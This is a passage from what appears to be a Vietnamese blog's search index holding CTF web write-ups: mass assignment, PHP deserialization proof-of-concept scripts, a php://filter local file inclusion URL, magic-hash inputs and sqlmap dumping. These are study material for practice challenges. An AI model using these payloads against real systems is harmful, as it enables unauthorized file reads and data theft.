setUsername(event.target.value)} /&gt; &lt;button onClick={create}&gt;Create&lt;/button&gt; &lt;div&gt;Users:&lt;/div&gt; {users.map((user) =&gt; ( &lt;div key={user.id}&gt; &lt;div&gt;Username: {user.username}&lt;/div&gt; &lt;div&gt;Is admin? {user.isAdmin ? \"yes\" : \"no\"}&lt;/div&gt; {user.isAdmin &amp;&amp; &lt;div&gt;{user.flag}&lt;/div&gt;} &lt;/div&gt; ))} &lt;/div&gt; );};export default Home;export const getServerSideProps: GetServerSideProps&lt;Props&gt; = async ( context) =&gt; { const users = (await prisma.user.findMany()) as Props[\"users\"]; for (const user of users) { if (user.isAdmin) { user.flag = process.env.FLAG!; } } return { props: { users, }, };};Trang web r·∫•t ƒë∆°n gi·∫£n, g·ªìm 1 c√°i form ƒë·ªÉ ƒëi·ªÅn username v√† n√∫t CreateKhi click v√†o button Create, web s·∫Ω POST ƒë·∫øn endpoint /api/auth v·ªõi body l√† usernameƒê·ªçc code ƒë·ªÉ xem endpoint /api/auth s·∫Ω l√†m g√¨Theo m√¨nh hi·ªÉu th√¨ n√≥ s·∫Ω l·∫•y d·ªØ li·ªáu ƒë∆∞·ª£c POST l√™n v√† t·∫°o 1 user m·ªõiN·∫øu user l√† admin, web s·∫Ω l·∫•y flag v√† in raOk quay tr·ªü l·∫°i v·ªõi request create userV√¨ /api/auth kh√¥ng h·ªÅ check l·∫°i body hay l·ªçc d·ªØ li·ªáu m√† ch·ªâ l·∫•y to√†n b·ªô body n√™n m√¨nh ch·ªâ c·∫ßn th√™m tr∆∞·ªùng ‚ÄúisAdmin‚Äù:trueOk ngon l√†nhFlag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}" }, { "title": "WhiteHat Play 11 Writeup", "url": "/posts/WhiteHat11/", "categories": "Writeup", "tags": "writeup, whitehatplay", "date": "2022-07-14 16:00:00 +0800", "snippet": "WhiteHat Play 11 WriteupWhite Hat 11WhiteHat 11 ƒë√£ k·∫øt th√∫c ƒë∆∞·ª£c v√†i tu·∫ßn (m√¨nh kh√¥ng nh·ªõ n·ªØa, qu√° gi√† ƒë·ªÉ nh·ªõ r·ªìi :^) ). V√† ƒë√¢y l√† ph·∫ßn writeup v·ªÅ t·∫•t c·∫£ c√°c web challenge. Xin l·ªói v√¨ n√≥ kh√¥ng theo th·ª© t·ª± ( M√¨nh vi·∫øt blog d·ª±a tr√™n b·∫£n m√¨nh ƒë√£ note l·∫°i trong l√∫c l√†m )Web07View source c·ªßa web07, ch√∫ng ta s·∫Ω th·∫•y t√°c gi·∫£ ƒë√£ ƒë·ªÉ l·∫°i hint &lt;!-- debug: GET is_debug=1 --&gt; ƒë·ªÉ anh em c√≥ th·ªÉ ƒë·ªçc code php&lt;head&gt; &lt;title&gt; Hello 500 AEm-xiao &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h1 style=\"color:green;\"&gt;xiao hello anh emmmmm&lt;/h1&gt; &lt;h3&gt;Join the race!!!!&lt;/h3&gt; &lt;/center&gt; &lt;div&gt;&lt;form&gt; Your Username:\t&lt;input name=\"uname\" type=\"text\" alt=\"uname\" align=\"right\"&gt;\tMessage: &lt;!--Here type=\"text\" align will not work--&gt; &lt;input name=\"mess\" type=\"text\" alt=\"mess\" align=\"right\"&gt;&lt;input type=submit &gt; &lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- debug: GET is_debug=1 --&gt;&lt;head&gt; &lt;title&gt; Hello 500 AEm-xiao &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h1 style=\"color:green;\"&gt;xiao hello anh emmmmm&lt;/h1&gt; &lt;h3&gt;Join the race!!!!&lt;/h3&gt;&lt;?php if(isset($_GET['uname']) &amp;&amp; isset($_GET['mess'])){\t$user = new User($_GET['uname'],$_GET['mess']);\t$user-&gt;say();}?&gt; &lt;/center&gt; &lt;div&gt;&lt;form&gt; Your Username:\t&lt;input name=\"uname\" type=\"text\" alt=\"uname\" align=\"right\"&gt;\tMessage: &lt;!--Here type=\"text\" align will not work--&gt; &lt;input name=\"mess\" type=\"text\" alt=\"mess\" align=\"right\"&gt;&lt;input type=submit &gt; &lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- debug: GET is_debug=1 --&gt;&lt;?phpif(isset($_GET['is_debug']) &amp;&amp; $_GET['is_debug']==='1'){ echo file_get_contents(__file__);}?&gt;&lt;/body&gt;&lt;?phpclass getFileSystem{\tpublic function __wakeup(){\t\tinclude('flag.php');\t\techo $flag;\t}}class User{\tpublic function __construct($u,$m){\t$this-&gt;username = $u;\t$this-&gt;message = $m;\t}\tpublic function say(){\t\techo \"&lt;h3 style=color:red&gt;\".$this-&gt;username.\" say: \".$this-&gt;message.\"&lt;/h3&gt;\";\t}\tpublic function __destruct(){\t\tif ($this-&gt;message==\"DucBTTBcuD\"){\t\t\tunserialize(base64_decode($this-&gt;username));\t\t}\t}}?&gt;&lt;/body&gt;Trong ph·∫ßn code PHP, ch√∫ng ta th·∫•y magic function __wakeup() (H√†m ƒë∆∞·ª£c g·ªçi khi unserialize m·ªôt chu·ªói th√†nh ƒë·ªëi t∆∞·ª£ng) s·∫Ω include file flag.php v√† in ra flag·ªû d∆∞·ªõi l√† h√†m check xem message c√≥ gi√° tr·ªã l√† DucBTTBcuD kh√¥ng, n·∫øu c√≥ s·∫Ω th·ª±c hi·ªán base64 decode v√† unserialize chu·ªói v·ª´a base64 decodeT·ª´ ƒë√¢y n√£o m√¨nh ƒë√£ load ƒë∆∞·ª£c vector t·∫•n c√¥ng: ch√∫ng ta s·∫Ω serialize 1 bi·∫øn thu·ªôc class getFileSystem v√† base64 encode chu·ªói v·ª´a serialize, sau ƒë√≥ b·ªè chu·ªói ƒë√≥ v√†o l√†m t√™n user + th√™m n·ªôi dung tin nh·∫Øn DucBTTBcuD . D∆∞·ªõi ƒë√¢y l√† POC:POC&lt;?phpclass getFileSystem{\tpublic function __wakeup(){\t\tinclude('flag.php');\t\techo $flag;\t}}class User{\tpublic function __construct($u,$m){\t$this-&gt;username = $u;\t$this-&gt;message = $m;\t}\tpublic function say(){\t\techo \"&lt;h3 style=color:red&gt;\".$this-&gt;username.\" say: \".$this-&gt;message.\"&lt;/h3&gt;\";\t}\tpublic function __destruct(){\t\tif ($this-&gt;message==\"DucBTTBcuD\"){\t\t\tunserialize(base64_decode($this-&gt;username));\t\t}\t}}$a = new User(\"hehe\",\"DucBTTBcuD\");$b = new getFileSystem();echo(base64_encode(serialize($b)));?&gt;Web01B√†i n√†y l√† b√†i web ƒë·∫ßu ti√™n m√¨nh g√µ, nh∆∞ng l√∫c ƒë·∫•y b·ªã l·ªói tri·ªÉn khai n√™n m√¨nh th√≥ c·ªù kh√° d·ªÖ =)) Anw, ƒë√¢y l√† c√°ch m√¨nh g√µ Web01.ƒê·∫ßu ti√™n theo ph·∫£n x·∫° khi ti·∫øp c·∫≠n 1 trang web, m√¨nh s·ª≠ d·ª•ng dirsearch v√† quan s√°t th·∫•y 1 ƒë∆∞·ªùng d·∫´n tr·∫£ v·ªÅ 200, ƒë√≥ l√† docker-compose.ymlTruy c·∫≠p &lt;ƒë·ªãa ch·ªâ ip&gt;/docker-compose.yml, m√¨nh ƒë∆∞·ª£c n·ªôi dung file nh∆∞ b√™n d∆∞·ªõiversion: '3.7'services: php-env: build: . ports: - '9020:80' volumes: - .:/var/www/html db: image: mysql command: --default-authentication-plugin=mysql_native_password restart: always volumes: - ./ctf.sql:/docker-entrypoint-initdb.d/ctf.sql environment: MYSQL_ROOT_PASSWORD: Nhat1998@ MYSQL_DATABASE: ctf MYSQL_USER: nhat1 MYSQL_PASSWORD: ywcQo7H]TsgLj35j@M√¨nh ƒë·ªÉ √Ω ƒë·∫øn ./ctf.sql , nghƒ©a l√† file ctf.sql ƒëang ·ªü th∆∞ m·ª•c g·ªëc c·ªßa trang web, th·ª≠ &lt;ƒë·ªãa ch·ªâ ip&gt;/ctf.sql,file ctf.sql ƒë√£ ƒë∆∞·ª£c t·∫£i v·ªÅ th√†nh c√¥ng =)))M·ªü file ctf.sql ra, ch√∫ng ta c√≥ flag =))T√≥m t·∫Øt l·∫°i th√¨ b√†i n√†yWeb05Truy c·∫≠p link c·ªßa web05 do ban t·ªï ch·ª©c cung c·∫•p, ch√∫ng ta c√≥ giao di·ªán trang web:Khi ƒëƒÉng nh·∫≠p sai, ng∆∞·ªùi d√πng s·∫Ω ƒë∆∞·ª£c redirect ƒë·∫øn trang source code PHP&lt;?php session_start(); $_SESSION['login'] = False; //checklogin if (isset($_POST['username']) &amp;&amp; $_POST['phone']){ if($_POST['username']==\"DucBT\" &amp;&amp; $_POST['phone'] == \"09xxxxxxx5\"){//10^10 bruteforce? $_SESSION['login'] = True; } } //get flag if ($_SESSION['login'] == True){ include_once 'get_flag.php'; session_destroy(); } echo show_source(\"check.php\", true);?&gt;B√†i n√†y kh√° l√† h√†i, v√¨ l√∫c ƒë·∫ßu m√¨nh ƒë√£ b·ªã l√∫ v√† nghƒ© theo h∆∞·ªõng type juggling (loose comparison)N√£o delay 1 l√∫c m·ªõi ƒë·ªçc kƒ© code v√† gi·∫£i ƒë∆∞·ª£c : ( ƒêo·∫°n code PHP s·∫Ω so s√°nh gi√° tr·ªã username do ng∆∞·ªùi d√πng nh·∫≠p v√†o v·ªõi chu·ªói DucBT , t∆∞∆°ng t·ª±, ƒëo·∫°n code s·∫Ω ƒë·ªìng th·ªùi so s√°nh gi√° tr·ªã password do ng∆∞·ªùi d√πng nh·∫≠p v√†o v·ªõi chu·ªói 09xxxxxxx5 , n·∫øu c·∫£ 2 so s√°nh th·ªèa m√£n s·∫Ω tr·∫£ v·ªÅ flag. Vi·ªác c·ªßa ch√∫ng ta l√† ch·ªâ c·∫ßn nh·∫≠p v√†o 2 gi√° tr·ªã DucBT v√† 09xxxxxxx5 (L√∫ nh∆∞ T n√∫)Flag: WhiteHat{Pe0ple_m4ke_it_complicated} &lt;?php session_start(); $_SESSION['login'] = False; //checklogin if (isset($_POST['username']) &amp;&amp; $_POST['phone']){ if($_POST['username']==\"DucBT\" &amp;&amp; $_POST['phone'] == \"09xxxxxxx5\"){//10^10 bruteforce? $_SESSION['login'] = True; } } //get flag if ($_SESSION['login'] == True){ include_once 'get_flag.php'; session_destroy(); } echo show_source(\"check.php\", true);?&gt;Web03Web03 ch·ªâ l√† b√†i warmup =)) T·∫•t c·∫£ vi·ªác c·∫ßn l√†m l√† view source v√† copy flag ü¶ùWhiteHat{N0nG_NhU_th3_n4y_th1_l4M_s40_Ph41_M4c}Web08Giao di·ªán c·ªßa web08Web08 c√≥ source code PHP nh∆∞ sau:&lt;?php error_reporting(0); if (isset($_GET['input'])) { $input = $_GET['input']; $to_replace = 'DucBTTPA'; $clean_string = preg_replace(\"/$to_replace/\", '', $input); echo \"&lt;p&gt;Your string is: $clean_string&lt;/p&gt;\"; if ($clean_string === $to_replace) { if(isset($_GET['input2']) &amp;&amp; isset($_GET['input3'])){ $input2 =$_GET['input2']; $input3 =$_GET['input3']; if($input2!==$input3 &amp;&amp; hash(\"sha256\",$input2)==hash(\"sha256\",$input3)){ echo \"&lt;h2 class=\\\"answer\\\"&gt;&lt;span style=\\\"color: green;\\\"&gt;Yesssss&lt;/span&gt;&lt;/h2&gt;\"; echo $flag; } } } else { echo \"&lt;h2 class=\\\"answer\\\"&gt;&lt;span style=\\\"color: red;\\\"&gt;Nooooo &lt;/span&gt;&lt;/h2&gt;\"; } } ?&gt;ƒêo·∫°n code s·∫Ω th·ª±c hi·ªán thay lo·∫°i b·ªè chu·ªói DucBTTPA trong chu·ªói ƒë·∫ßu v√†o c·ªßa ng∆∞·ªùi d√πng v√† ti·∫øp t·ª•c so s√°nh ƒë·∫ßu v√†o c·ªßa ng∆∞·ªùi d√πng v·ªõi chu·ªói c·∫ßn lo·∫°i b·ªè DucBTTPA ( Nghe tr√°i kho√°y vl (‚óè‚Äô‚ó°‚Äô‚óè) ). N·∫øu chu·ªói b·ªã lo·∫°i b·ªè v·∫´n c√≤n t·ªìn t·∫°i th√¨ s·∫Ω ti·∫øp t·ª•c ƒëi v√†o 1 ƒëo·∫°n if n·ªØa m√† m√¨nh s·∫Ω gi·∫£i th√≠ch ·ªü d∆∞·ªõi. B√¢y gi·ªù t·∫≠p trung v√†o pass ƒë∆∞·ª£c ƒëi·ªÅu ki·ªán c·ªßa c√¢u if ƒë·∫ßu ti√™n ü¶ù ƒê∆°n gi·∫£n ƒë·ªÉ th·∫•y ƒëo·∫°n code th·ª±c hi·ªán lo·∫°i b·ªè chu·ªói DucBTTPA ch·ªâ th·ª±c hi·ªán lo·∫°i b·ªè 1 l·∫ßn chu·ªói c·∫ßn lo·∫°i b·ªè, cho n√™n bypass r·∫•t d·ªÖ b·∫±ng c√°ch nh·∫≠p v√†o chu·ªói DucBTDucBTTPATPA , v√¨ ch·ªâ lo·∫°i b·ªè 1 l·∫ßn n√™n chu·ªói sau khi lo·∫°i b·ªè s·∫Ω v·∫´n l√† chu·ªói DucBTTPAHo·∫∑c c√≥ th·ªÉ nh·∫≠p chu·ªói nh∆∞ h√¨nh d∆∞·ªõi, k·∫øt qu·∫£ t∆∞∆°ng t·ª±Ti·∫øp theo, ƒëo·∫°n code s·∫Ω th·ª±c hi·ªán check input2 v√† input3 l√† gi√° tr·ªã ƒë·∫ßu v√†o do ng∆∞·ªùi d√πng cung c·∫•p, n·∫øu gi√° bƒÉm b·∫±ng thu·∫≠t to√°n SHA-256 c·ªßa 2 chu·ªói gi·ªëng nhau th√¨ s·∫Ω tr·∫£ v·ªÅ flagM√¨nh s·ª≠ d·ª•ng magic hashes ( ƒê·∫°i lo·∫°i l√† nh·ªØng chu·ªói kh√°c nhau nh∆∞ng s·∫Ω c√πng cho ra 1 gi√° tr·ªã bƒÉm (Keyword hash collisioncho b·∫°n n√†o mu·ªën research th√™m :3 ) List c√°c magic hashes m√¨nh ƒë·ªÉ ·ªü ƒë√¢y: hashes/sha256.md at master ¬∑ spaze/hashes (github.com)Sau khi cung c·∫•p ƒë·∫ßu v√†o input1, input2 l√† c√°c chu·ªói magic hash, ch√∫ng ta s·∫Ω c√≥ flag ‚ï∞(¬∞‚ñΩ¬∞)‚ïØhttp://192.81.209.60:8844/?input=DuDucBTTPAcBTTPA&amp;input2=34250003024812&amp;input3=TyNOQHUSWeb04Giao di·ªán c·ªßa Web04, ch·ª©c nƒÉng ƒë∆°n gi·∫£n tr√™n trang web l√† b·∫°n nh·∫•n v√†o 1 trong 5 ƒë·ªãa ch·ªâ, trang web s·∫Ω render ra 1 t·∫•m ·∫£nh v·ªÅ ƒë·ªãa ch·ªâ ƒë·∫•yƒê·ªÉ √Ω URL c·ªßa trang web c√≥ d·∫°ng http://&lt;ƒë·ªãa ch·ªâ ip&gt;/index.php?gif=&lt;T√™n ƒë·ªãa ch·ªâ&gt; m√¨nh ƒë√£ ngh·ªâ ƒë·∫øn Path Traversal, nh∆∞ng th·ª≠ 1 h·ªìi kh√¥ng ra v√† 1 ng∆∞·ªùi anh ƒë√°ng m·∫øn ƒë√£ g·ª£i √Ω cho m√¨nh v·ªÅ 1 k·ªπ thu·∫≠t m√† m√¨nh l√£ng qu√™n PHP Wrapper.S·ª≠ d·ª•ng php://filter/convert.base64-encode/resource=index ƒë·ªÉ l·∫•y source code c·ªßa trang index.php d∆∞·ªõi d·∫°ng base64http://164.92.81.231:8004/index.php?gif=php://filter/convert.base64-encode/resource=indexTrang web tr·∫£ v·ªÅ chu·ªói base64PGh0bWw+DQo8dGl0bGU+U2VsZWN0IFRyaXA8L3RpdGxlPg0KPGJvZHk+DQoNCgkNCjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZHVjYnQuY3NzIj4NCjxoMSBzdHlsZT0iZm9udC1mYW1pbHk6IGN1cnNpdmU7Ij5TZWxlY3QgbTMuLjwvaDE+DQo8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSdnZXQnIG5hbWU9IiIgID4NCgk8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgIDxkaXYgY2xhc3M9InJvdyBzaGFyZS1idXR0b25zIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTggY29sLW1kLW9mZnNldC0yIj4NCiAgICAgICAgIDxkaXYgc3R5bGU9Im1hcmdpbjogYXV0bzsiPg0KICAgICAgICAgCSAgIDx1bCA+DQogICAgICAgICAgICAgICAgPGxpID4NCiAgICAgICAgICAgICAgICAgICAgPGgxPjB4Nzg8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0nZ2lmJyB2YWx1ZT0nY290byc+DQogICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtZ2l0aHViIj48L2k+DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBDw7QgVMO0DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHgxMTE8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJibHVlIGJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdjb25kYW8nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXR3aXR0ZXIiPjwvaT4NCiAgICAgICANCiAgICAgICAgICAgICAgICAgICAgIEPDtG4gxJDhuqNvDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHgxMTE8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXR0b24gcGluayIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdreWNvJz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1waW50ZXJlc3QiPjwvaT4NCiAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICBL4buzIENvDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHg5ODwvaDE+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ1dHRvbiBncmVlbiIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdob2NvYyc+DQogICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtdmluZSI+PC9pPg0KICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBOaGEgVHJhbmcNCiAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9saT4NCiAgICAgICAgICAgICAgICA8bGk+DQogICAgICAgICAgICAgICAgICAgIDxoMT4weDMzPC9oMT4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIHJlZCIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdwaHVxdW9jJz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1nb29nbGUtcGx1cyI+PC9pPg0KICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgIFBow7ogUXXhu5FjDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICA8L3VsPg0KICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KPC9kaXY+DQo8L2Zvcm0+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCjw/cGhwDQoJZXJyb3JfcmVwb3J0aW5nKDApOw0KCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQoJJGNob249Jyc7DQoJaWYoaXNzZXQoJF9HRVRbJ2dpZiddKSl7DQoNCgkJJGNob24gPSAkX0dFVFsnZ2lmJ107DQoJfQ0KCWlmKCRjaG9uID09ICJwbGF5MTFmaXgiKXsNCgkJZWNobyBmaWxlX2dldF9jb250ZW50cygieG54eC50eHQiKTsNCgl9DQoJZWxzZQ0KCXsNCgkJaW5jbHVkZSgkY2hvbi4iLnBocCIpOw0KCX0JDQo/Pg0KS·ª≠ d·ª•ng Cyberchef ƒë·ªÉ decode, ch√∫ng ta ƒë∆∞·ª£c source c·ªßa trang webFull source cho b·∫°n n√†o mu·ªën d·ª±ng lab l·∫°i ‚òÜ: .ÔΩ°. o(‚âß‚ñΩ‚â¶)o .ÔΩ°.:‚òÜ&lt;html&gt;&lt;title&gt;Select Trip&lt;/title&gt;&lt;body&gt;&lt;link rel=\"stylesheet\" href=\"ducbt.css\"&gt;&lt;h1 style=\"font-family: cursive;\"&gt;Select m3..&lt;/h1&gt;&lt;form action=\"index.php\" method='get' name=\"\" &gt;\t&lt;div class=\"container\"&gt; &lt;div class=\"row share-buttons\"&gt; &lt;div class=\"col-md-8 col-md-offset-2\"&gt; &lt;div style=\"margin: auto;\"&gt; \t &lt;ul &gt; &lt;li &gt; &lt;h1&gt;0x78&lt;/h1&gt; &lt;button class=\"button\" type=\"submit\" name='gif' value='coto'&gt; &lt;i class=\"fa fa-github\"&gt;&lt;/i&gt; C√¥ T√¥ &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x111&lt;/h1&gt; &lt;button class=\"blue button\" type=\"submit\" name='gif' value='condao'&gt; &lt;i class=\"fa fa-twitter\"&gt;&lt;/i&gt; C√¥n ƒê·∫£o &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x111&lt;/h1&gt; &lt;button class=\"button pink\" type=\"submit\" name='gif' value='kyco'&gt; &lt;i class=\"fa fa-pinterest\"&gt;&lt;/i&gt; K·ª≥ Co &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x98&lt;/h1&gt; &lt;button class=\"button green\" type=\"submit\" name='gif' value='hococ'&gt; &lt;i class=\"fa fa-vine\"&gt;&lt;/i&gt; Nha Trang &lt;/button&gt; &lt;/li&gt; &lt;li&gt; &lt;h1&gt;0x33&lt;/h1&gt; &lt;button class=\"button red\" type=\"submit\" name='gif' value='phuquoc'&gt; &lt;i class=\"fa fa-google-plus\"&gt;&lt;/i&gt; Ph√∫ Qu·ªëc &lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php\terror_reporting(0);\tini_set('display_errors', 0);\t$chon='';\tif(isset($_GET['gif'])){\t\t$chon = $_GET['gif'];\t}\tif($chon == \"play11fix\"){\t\techo file_get_contents(\"xnxx.txt\");\t}\telse\t{\t\tinclude($chon.\".php\");\t}?&gt;Source code PHP c√≥ ƒëo·∫°n code check, n·∫øu gi√° tr·ªã ƒë·∫ßu v√†o do ng∆∞·ªùi d√πng nh·∫≠p l√† play11fix th√¨ s·∫Ω l·∫•y ra n·ªôi dung file √≠ch n·ªù xx ch·∫•m txt .Sau khi nh·∫≠p v√†o ch√∫ng ta s·∫Ω ƒë∆∞·ª£c flag ü¶ùWhiteHat{B3@ut1ful_B3@ch_D3st1n@t10ns_1n_V13tn@m}Web06Web06 m√¨nh kh√¥ng note hay screenshot nhi·ªÅu t·∫°i v√¨ m√¨nh l√†m v·ªõi t√¢m tr·∫°ng cay c√∫ =))) (v√¨ th·∫ø ƒë√£ ƒë·∫•m n√≥ b·∫±ng sqlmap, xin l·ªói n·∫øu l√†m ·∫£nh h∆∞·ªüng ƒë·∫øn tr·∫£i nghi·ªám duy·ªát web v√† ch∆°i ctf c·ªßa c√°c b·∫°n :^ )Ok, test v·ªõi sqlmap m√¨nh l·∫•y ƒë∆∞·ª£c t√™n database public, b·∫£ng pokemon v√† bi·∫øt ƒë∆∞·ª£c c√≥ t·ªïng c·ªông 899 b·∫£n ghi trong b·∫£ng pokemon .Nh∆∞ng tr√™n web ch·ªâ hi·ªÉn th·ªã 898 pokemon, th·ªÉ n√™n m√¨nh s·ª≠ d·ª•ng sqlmap ƒë·ªÉ dump ra con pokemon c√≥ id=899V√† ƒë√¢y l√† con h√†ng th·ª© 899, flag c·ªßa b√†i n√†y, c≈©ng l√† b√†i duy nh·∫•t trong web challenge m√† m√¨nh ch∆∞a th√≥ ƒë∆∞·ª£c flagBonus th√™m 1 b√†i misc m√† m√¨nh kh√¥ng nghƒ© s·∫Ω gi·∫£i ra b·∫±ng c√°ch n√†y, l·∫°i 1 l·∫ßn n·ªØa, anh B·∫£nh th·ªët l√™nC·∫£m ∆°n WhiteHat ƒë√£ t·ªï ch·ª©c gi·∫£i CTF l·∫ßn n√†y, c≈©ng v·ª´a ƒë√∫ng d·ªãp ƒë·ªÉ m√¨nh ki·ªÉm tra xem b·∫£n th√¢n ƒë√£ h·ªçc v√† l√†m ƒë∆∞·ª£c nh·ªØng g√¨ ‚ï∞(¬∞‚ñΩ¬∞)‚ïØ. Shout out to nh·ªØng ng∆∞·ªùi anh em x∆∞∆°ng m√°u ‚ï∞(¬∞‚ñΩ¬∞)‚ïØ" }, { "title": "PHP Object Injection BlueCyber", "url": "/posts/PHPObjInjection/", "categories": "Writeup", "tags": "writeup, php_object_injection", "date": "2022-05-19 12:00:00 +0800", "snippet": "PHP Object Injection BlueCyberLab1Source code&lt;?phpinclude 'flag.php';class pkshow{ function echo_name() { return \"Pk very safe^.^\"; }}class acp{ protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new pkshow; } function __toString() { if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); }}class ace{ public $filename; public $openstack; public $docker; function echo_name() { $this-&gt;openstack = unserialize($this-&gt;docker); if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) { $file = \"./{$this-&gt;filename}\"; if (file_get_contents($file)) { return file_get_contents($file); } else { return \"keystone lost~\"; } } }}if (isset($_GET['pks'])){ $logData = unserialize($_GET['pks']); echo $logData;}else{ highlight_file(__file__);}?&gt;Trang web nh·∫≠n tham s·ªë ƒë·∫ßu v√†o pks theo ph∆∞∆°ng th·ª©c GET v√† ti·∫øn h√†nh unserialize. √ù t∆∞·ªüng ·ªü ƒë√¢y l√† t√πy ch·ªânh gi√° tr·ªã tham s·ªë pks ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c n·ªôi dung file flag.php ch·ª©a flag.·ªû magic method __construct(), bi·∫øn cinder ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o l√† 1 ƒë·ªëi t∆∞·ª£ng thu·ªôc l·ªõp pkshow c√≥ ph∆∞∆°ng th·ª©c echo_name() ƒë·ªÉ in ra 1 chu·ªóiTa quan t√¢m ƒë·∫øn magic method __toString() s·∫Ω g·ªçi ph∆∞∆°ng th·ª©c echo_name() c·ªßa bi·∫øn cinder n·∫øu bi·∫øn cinder ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°oTi·∫øp t·ª•c quan s√°t source code, ta th·∫•y class ace c√≥ ph∆∞∆°ng th·ª©c c√≥ c√πng t√™n ( echo_name() ) s·∫Ω in ra n·ªôi dung c·ªßa 1 file n·∫øu ƒëi·ªÅu ki·ªán if th·ªèa m√£nH∆∞·ªõng gi·∫£i quy·∫øt: G√°n thu·ªôc t√≠nh cinder c·ªßa class acp b·∫±ng 1 ƒë·ªëi t∆∞·ª£ng thu·ªôc class ace, magic method __toString() c·ªßa class acp s·∫Ω trigger h√†m echo_name() ƒë·ªÉ in ra n·ªôi dung file t√πy √Ω do ng∆∞·ªùi d√πng cung c·∫•pVi·ªác c·∫ßn gi·∫£i quy·∫øt cu·ªëi c√πng l√† l√†m cho c√¢u l·ªánh ƒëi·ªÅu ki·ªán if ƒë√∫ng ƒë·ªÉ c√≥ th·ªÉ in ra n·ªôi dung fileƒê·ªÉ c√¢u l·ªánh if lu√¥n ƒë√∫ng, ta s·∫Ω t·∫°o ra m·ªôt class tmp ch·ª©a 2 thu·ªôc t√≠nh neutron v√† nova, sau ƒë√≥ g√°n cho bi·∫øn docker m·ªôt ƒë·ªëi t∆∞·ª£ng thu·ªôc l·ªõp tmp, khi ƒë√≥ c√¢u l·ªánh if s·∫Ω so s√°nh 2 gi√° tr·ªã null v√† lu√¥n tr·∫£ v·ªÅ trueVi·ªác cu·ªëi c√πng c·∫ßn l√†m l√† g√°n ƒë∆∞·ªùng link ƒë·∫øn file c·∫ßn ƒë·ªçcPOC&lt;?phpclass acp{ protected $cinder; public $neutron; public $nova; function __construct() { $this-&gt;cinder = new ace(); }}class tmp { public $neutron; public $nova;}class ace{ public $filename = 'flag.php'; public $openstack; public $docker; public function __construct() { $this-&gt;docker = serialize(new tmp()); }}$a = new acp();// echo \"\\n\";// echo serialize($a);echo \"\\n\";echo(urlencode(serialize($a)));?&gt;FlagLab3Trong file index.php c√≥ ƒëo·∫°n code php kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng player v·ªõi t√™n do ng∆∞·ªùi d√πng nh·∫≠p v√†o, sau ƒë√≥ set cookie hero v·ªõi 